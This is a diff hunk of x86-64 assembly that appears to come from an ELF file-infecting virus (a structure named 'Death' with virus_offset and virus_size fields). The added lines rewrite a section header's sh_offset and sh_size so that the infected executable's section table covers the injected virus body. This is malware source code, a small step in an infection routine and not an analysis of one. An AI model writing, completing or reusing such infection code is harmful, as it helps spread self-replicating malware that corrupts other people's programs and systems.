@@ -812,6 +812,15 @@ section .text
         cld
         rep movsb
 
+        ; sh_offset = virus_offset
+        mov rbx, VAR(Death.virus_offset)
+        mov [rax + Elf64_Shdr.sh_offset], rbx
+
+        ; sh_size = virus_size
+        xor rbx, rbx
+        mov ebx, dword VAR(Death.virus_size)
+        mov [rax + Elf64_Shdr.sh_size], rbx
+
     .unique_trace:
         xor rax, rax
         lea rsi, [rel Traza]
